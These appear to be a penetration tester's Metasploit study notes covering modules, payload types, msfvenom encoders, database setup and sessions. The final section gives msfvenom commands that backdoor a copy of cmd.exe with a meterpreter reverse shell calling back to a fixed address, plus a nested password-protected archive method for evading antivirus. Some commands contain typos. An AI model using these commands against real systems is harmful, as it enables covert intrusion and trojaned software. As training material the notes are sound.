### Checkout the modules in `msfconsole`
```bash
ls /usr/share/metasploit-framework/modules
# auxiliary encoders evasion exploits nops payloads post
```
### Listing plugins (can be manually setup / added)
```bash
ls /usr/share/metasploit-framework/plugins/
```
### Listing Scripts
```bash
ls /usr/share/metasploit-framework/scripts/
```
### Listing Available tools
```bash
ls /usr/share/metasploit-framework/tools/
```
## Starting
- installation
```bash
sudo apt update && sudo apt install metasploit-framework
```
- Start the `msfconsole` (no banner option `-q`)
```bash
msfconsole -q
```
- Stages for engagements using `MSF`
	- Enumeration
	- Preparation
	- Exploitation
	- Privilege Escalation
	- Post-Exploitation
## Modules
### Name structure
```
<No.> <type>/<os>/<service>/<name>
794 exploit/windows/ftp/scriptftp_list
```
- We can only use the `use <no. >` with the following modules -> `Auxiliary - Exploits - Post`
### searching for modules
- `search` command syntax
```
search [options] keywords
```
- based on the returned results
```bash
info <no.> # show basic information
info -d <no.> # generated detailed information in a .html file to be shown in the browser
use <no.>  # use the target module
```
- show command option
```
show missing 
show options # or `options`
show advanced
show targets
etc
```
- we can set options
```bash
set lhost 10.10.17.34
set lhost tun0
set rhost 10.132.33.135

#setg for global settings
setg lhost tun0
setg rhost 10.132.33.135 
```
## Payloads
- Differences between Payloads and Exploits
```bash
                ┌──────────────┐
                │   EXPLOIT    │
                │ triggers bug │
                └──────┬───────┘
                       │ code execution
                       ▼
                ┌──────────────┐
                │   PAYLOAD    │
                │ runs after   │
                │ exploitation │
                └──────┬───────┘
                       │
     ┌─────────────────┼─────────────────┐
     │                 │                 │
     ▼                 ▼                 ▼
┌──────────┐     ┌──────────┐      ┌──────────┐
│  Single  │     │  Stager  │ ---> │  Stage   │
│ all-in-1 │     │ tiny stub│      │ real job │
└──────────┘     └──────────┘      └──────────┘
```
- Types of payloads (Single - Stager - Stages)
```bash
                    METASPLOIT PAYLOADS

                         Payload
                            │
        ┌───────────────────┴───────────────────┐
        │                                       │
        ▼                                       ▼
   Single / Stageless                        Staged
        │                                       │
        │                              ┌────────┴────────┐
        │                              ▼                 ▼
        │                           Stager            Stage
        │                              │                 │
        │                              │ opens path      │ does real work
        │                              ▼                 ▼
        │                       reverse_tcp        shell / meterpreter
        │                       reverse_https      VNC / others
        │                       bind_tcp
        ▼
 one self-contained blob
```
### Searching for payloads
- using Grep at the beginning
```bash
grep meterpreter show payloads
```
- We can use as many greps as we want
```bash
grep meterpreter grep reverse_tcp show payloads
```

## Encoders 
- we can add encoding options to the payloads using `msfvenom` or from inside after choseing the payload for the exploit
- Basic usage of `msfvenom`
```bash
msfvenom -l encoders #list the encoders
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp -e cmd/base64 -i 10 -b '\x00' -f exe -o exploit.exe
```
- From inside the `msfconsole` we can use `show encoders` to chose which encoder to be used on our beloved payload and set its options 
- `x86/shikata_ge_nai` encoder had great success in the past 
### Options to use
1. `-i`  adding iterations of encoding
2. `-p` specifying the payload path
3. `-o` output file name
4. `-a` target system architecture 
5. `--paltform` target system OS
6. `-b` for skipping bad chars
7. `-e` for encoder type
8. `-f` file format


## Setting up msf with database
1. setup postgresql
```bash
sudo service postgresql status
sudo systemctl start postgresql
```
2. initialize msf database
```bash
sudo msfdb init
sudo msfdb status
sudo msfdb run

# reintialize database
sudo msfdb reinit 
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/  
sudo service postgresql restart
```
3. List database commands from `msfconsole`
```
help database
```


## Plugins
### Installing plugins
1. download the `<plugin>.rb`
2. copy the plugin file into `/usr/share/metasploit-framework/plugins`
### Activate plugins
```bash
load <plugin>
```


## Sessions
### Interacting with meterpreter sessions
```
sessions -l
sessions -i <id>          #interacting with a session
sessions -i 1 -n new_name #renaming sessions
sessions -u 1             #upgrading normal shell session to meterpreter
```
### Using jobs at the background
```bash
jobs -h
jobs -l
exploit -j #to run the exploit in the background
```

## Evading Firewalls, IDS and IPS (High-level)
### 1. backdooring payload into a normal executable
- using `msfvenom` we can inject our payload inside `cmd.exe` and when pressed it will run normally and launch our backdoor
```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/cmd.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/cmd.exe -i 5
```
### 2. Archiving
- another way to evade AVs is by archiving files with passwords, and this also could be iterative 
```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

# ARCIVE our payload
rar a ~/test.rar -p ~/test.js

# Remove the .RAR
mv test.rar test

# Double archive it
rar a test2.rar -p test
mv test2.rar test2

```

### Most common packing softwares
| **Packer Name**                                                                         |
| --------------------------------------------------------------------------------------- |
| [UPX packer](https://upx.github.io/)                                                    |
| Alternate EXE Packer                                                                    |
| MEW                                                                                     |
| [The Enigma Protector](https://enigmaprotector.com/)                                    |
| ExeStealth                                                                              |
| Themida                                                                                 |
| [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm) |
| Morphine                                                                                |
